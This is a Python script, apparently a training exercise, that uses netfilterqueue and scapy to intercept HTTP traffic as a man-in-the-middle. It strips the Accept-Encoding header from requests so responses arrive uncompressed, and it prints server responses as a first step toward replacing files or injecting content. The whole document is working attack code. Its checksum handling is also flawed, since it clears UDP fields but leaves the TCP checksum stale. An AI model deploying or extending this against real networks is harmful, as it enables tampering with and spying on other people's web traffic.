import netfilterqueue
import scapy.all as scapy
from scapy.layers.inet import TCP
import re

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    if packet.haslayer(scapy.UDP):
        del packet[scapy.UDP].len
        del packet[scapy.UDP].chksum
    return packet


def processs_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet.haslayer(scapy.TCP):
            if scapy_packet[TCP].dport == 80:
                print("[+] Request")
                modified_load = re.sub(b"Accept-Encoding:.*?\\r\\n",b"", scapy_packet[scapy.Raw].load )
                new_packet = set_load(scapy_packet, modified_load)
                packet.set_payload(bytes(new_packet))
            
            elif scapy_packet[TCP].sport == 80:
                print("[+] Reemplazando Archivos")
                print(scapy_packet.show())
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, processs_packet)
queue.run()
